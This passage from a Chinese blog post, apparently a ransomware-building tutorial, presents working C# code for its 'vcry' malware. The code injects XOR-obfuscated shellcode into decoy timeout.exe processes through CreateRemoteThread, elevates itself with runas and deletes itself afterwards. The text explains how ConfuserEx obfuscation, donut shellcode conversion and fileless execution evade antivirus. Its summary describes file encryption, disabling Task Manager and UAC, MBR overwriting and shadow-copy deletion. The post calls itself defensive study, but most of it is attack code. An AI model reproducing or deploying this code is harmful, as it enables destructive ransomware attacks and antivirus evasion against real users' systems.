1. **代码混淆与检测绕过**：我们可以编写恶意dll文件(`vcry.dll`)，再通过 `ConfuserEx` 等软件进行代码混淆，防止静态检测，以此绕过火绒等杀毒软件。
2. **中间层的加载与反取证设计**：将托管的 `vcry.dll` 动态加载到内存，借助反射机制触发内存驻留恶意代码片段的执行。完成恶意行为后，程序采用全零字节覆盖写入策略清除文件存储数据，随后执行文件擦除操作。
3. **系统程序滥用与无文件攻击**：主程序脱嵌两个dll文件，并利用合法系统程序`rundll32.exe`加载中间层，实现了一定的无文件攻击手段。最后将主程序通过 `ConfuserEx` 进行代码混淆，即可绕过火绒等杀毒软件的静态检测，并执行一系列恶意操作，当火绒动态检测并拦截的时候，已经无力回天。
## 3.7 内存注入(vcry.exe进阶版)
### 3.7.1 Inject.cs

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace VortexSecOps.HarmfulSysHacks
{
    internal class Inject
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
        /// <summary>
        /// 在目标进程中注入可执行代码（Shellcode）
        /// </summary>
        /// <param name="hProcess">进程句柄</param>
        /// <param name="shellcode">可执行代码（Shellcode）</param>
        /// <exception cref="System.ComponentModel.Win32Exception"></exception>
        public static void ShellcodeInject(IntPtr hProcess, byte[] shellcode)
        {
            IntPtr shellcodeAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
            if(shellcodeAddress == IntPtr.Zero)
            {
                throw new System.ComponentModel.Win32Exception();
            }
            if(!WriteProcessMemory(hProcess, shellcodeAddress, shellcode, (uint)shellcode.Length, out int bytesWritten) || bytesWritten != shellcode.Length)
            {
                VirtualFreeEx(hProcess, shellcodeAddress, 0, 0x8000);
                throw new System.ComponentModel.Win32Exception();
            }
            IntPtr threadHandle = CreateRemoteThread(hProcess, IntPtr.Zero, 0, shellcodeAddress, IntPtr.Zero, 0, out IntPtr threadId);
            if (threadHandle == IntPtr.Zero)
            {
                VirtualFreeEx(hProcess, shellcodeAddress, 0, 0x8000);
                throw new System.ComponentModel.Win32Exception();
            }
            CloseHandle(threadHandle);
        }
        public static void XORCrypt(byte[] data, byte key)
        {
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key;
            }
        }
    }
}

```

1. **内存注入是一种常常被恶意利用的技术，通过向目标进程的内存空间写入恶意代码(如 Shellcode)并执行，从而实现控制目标进程的目的。常见用途包括**：
    - 绕过安全防护（如杀毒软件对磁盘文件的检测）。
    - 在目标进程中隐藏恶意行为（动态注入内存，无磁盘文件落地）。
    - 窃取数据、提升权限或建立后门。
2. **关键步骤解析**：
    - 内存分配（`VirtualAllocEx`）：
      - 在目标进程（由`hProcess`指定）中分配一块可读、可写、可执行的内存（`PAGE_EXECUTE_READWRITE`）。
    - 写入 Shellcode（`WriteProcessMemory`）：
      - 将恶意代码（shellcode）写入目标进程的内存空间，确保所有字节写入成功，否则释放内存并抛出异常。
    - 执行 Shellcode（`CreateRemoteThread`）：
      - 通过创建远程线程，强制目标进程从`shellcodeAddress`开始执行代码，实现恶意逻辑注入。
3. **`XORCrypt` 方法：**

```csharp
public static void XORCrypt(byte[] data, byte key)
{
    for (int i = 0; i < data.Length; i++)
    {
        data[i] ^= key; // 异或加密/解密
    }
}
```
   - **作用**：对shellcode进行异或加密，避免被安全软件静态检测到恶意特征（如特征码匹配）。
   - **使用场景**：在注入前，先对原始 Shellcode 进行加密存储，注入时用相同密钥解密后写入内存。
### 3.7.2 Program.cs

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using VortexSecOps.HarmfulSysHacks;

namespace vcry
{
    internal class Program
    {
        /// <summary>
        /// 检测是否为管理员身份运行
        /// </summary>
        /// <returns>是管理员返回 true，不是则为 false</returns>
        public static bool IsRunningAsAdministrator()
        {
            // 获取当前用户的身份信息
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            // 创建 Windows 主体对象
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            // 检查是否为管理员角色
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        /// <summary>
        /// 以管理员身份运行自身进程
        /// </summary>
        public static void RestartCurrentAppAsAdmin()
        {
            // 创建进程启动信息对象
            ProcessStartInfo startInfo = new ProcessStartInfo();
            // 设置要启动的进程的文件名
            startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
            // 设置以管理员身份运行
            startInfo.Verb = "runas";
            try
            {
                // 启动进程
                Process.Start(startInfo);
            }
            catch (Exception)
            {

            }
            finally
            {
                // 退出当前进程
                Environment.Exit(0);
            }
        }
        static async Task Main(string[] args)
        {
            if (!IsRunningAsAdministrator())
            {
                RestartCurrentAppAsAdmin();
            }
            using (Process process= new Process())
            { 
                process.StartInfo= new ProcessStartInfo
                {
                    FileName = "timeout.exe", 
                    Arguments = "/T -1 /NOBREAK",
                    Verb = "runas", 
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                for(int i = 0; i<7;i++)
                {
                    Process.Start(process.StartInfo);
                }
                process.Start();
                await Task.Delay(500);
                if (!process.HasExited)
                {
                    byte[] shellcode = Convert.FromBase64String(Resources.shellcodeBase64);
                    Inject.XORCrypt(shellcode, 0xAA);
                    try
                    {
                        Inject.ShellcodeInject(process.Handle, shellcode);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error injecting shellcode: {ex.ToString()}");
                        Console.ReadLine();
                        return;
                    }
                }
            }
            using(Process process = new Process())
            {
                process.StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c timeout /t 1 /NOBREAK&&del /q \"{Process.GetCurrentProcess().MainModule.FileName}\"",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                process.Start();
            }
            // 退出当前进程
            Environment.Exit(0);
        }
    }
}

```
我们可以通过使用`donut`工具直接将vcry.dll的shellcode提取出来，以实现无文件的内存驻留
```
donut -f 3 -a 2 -m start vcry.dll
```

1. **权限滥用与隐蔽执行** 
   - 通过`runas`强制以管理员身份运行，获取系统级控制权限。
   - 创建 8 个`timeout.exe`进程（7 个通过循环启动，1 个通过`process.Start()`），利用系统合法进程隐藏真实注入目标（仅最后一个进程被注入），属于典型的**进程迷惑术**。
2. **内存驻留与无文件攻击**
   - 加密的 Shellcode 通过 `Base64` 编码存储，运行时动态解密并注入内存，磁盘无恶意代码落地，传统杀毒软件难以检测。
   - 注入后立即自删除（`del /q`），实现 “单次运行 + 内存驻留”，攻击痕迹极难溯源。
3. **对抗细节设计**
   - `CreateNoWindow = true`隐藏所有进程窗口，避免用户察觉异常。
   - `Task.Delay(500)`等待进程稳定后再注入，降低因进程未启动导致的失败率。
   - 为了绕过静态检测，主程序代码需要与框架隔离，所以这边单独写了个提权函数`RestartCurrentAppAsAdmin`和`IsRunningAsAdministrator`。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e9ce3463617a47e4b1ea572e8beaee28.png#pic_center)
# 4. 总结
## 4.1 数据加密模块
- 实现了使用 AES 和 RSA 加密算法对文件进行加密的功能。通过 `AesRsaEncryptionManager` 类提供的方法，能够对多种类型的文件（如办公文档、数据库文件、图片、视频、音频和压缩文件等）进行加密。同时，通过 TCP 协议从服务器获取AES密钥包，确保加密过程的安全性和复杂性。这一模块实现了勒索病毒对用户数据的加密行为，使我们深刻认识到数据加密在勒索攻击中的重要性。
## 4.2 文件遍历模块
- `FileTraverser` 类实现了对指定目录及其子目录下文件的遍历功能。该模块支持指定搜索字符串和不指定两种方式，通过栈来递归遍历文件，确保能够全面扫描系统中的文件。在遇到异常时，能够直接跳过，保证遍历过程的稳定性。这一模块为后续的文件加密操作提供了基础，使勒索病毒能够快速定位并加密目标文件。
## 4.3 注册表配置模块
- `RegistryConfigurer` 类实现了对注册表的一系列操作，包括禁用注册表编辑器、控制面板和任务管理器，启用或禁用 Windows 功能限制，配置启动程序，关闭用户账户控制（UAC）等。通过修改注册表，勒索病毒可以限制用户对系统的正常操作，增加用户恢复系统的难度。这一模块的实现让我们了解到注册表在系统安全中的重要作用，以及勒索病毒如何利用注册表进行恶意攻击。
## 4.4 系统操作模块
- `MalwareIntruder` 类包含了一些恶意操作方法，如触发蓝屏、修改主引导记录（MBR）、禁用 Windows 恢复环境、获取文件所有权、删除所有卷影副本等。这些操作会严重破坏系统的正常运行，导致系统无法启动或出现严重故障。通过实现这些功能，我们更加深入地了解了勒索病毒对系统的破坏能力，以及如何防范此类攻击。
## 4.5 高级技术实现
- 通过对加密程序以及中间层的无文件攻击与系统程序的滥用，我们可以更深入地了解勒索病毒的隐蔽性与运作机制，帮助大家更好地防范这类恶意软件的攻击。

**通过此次项目实战，我们深入洞悉了勒索病毒从脱壳隐藏到数据加密的一系列复杂手段，这不仅是一次技术的试炼，更是我们提升网络安全防护能力的宝贵契机。**
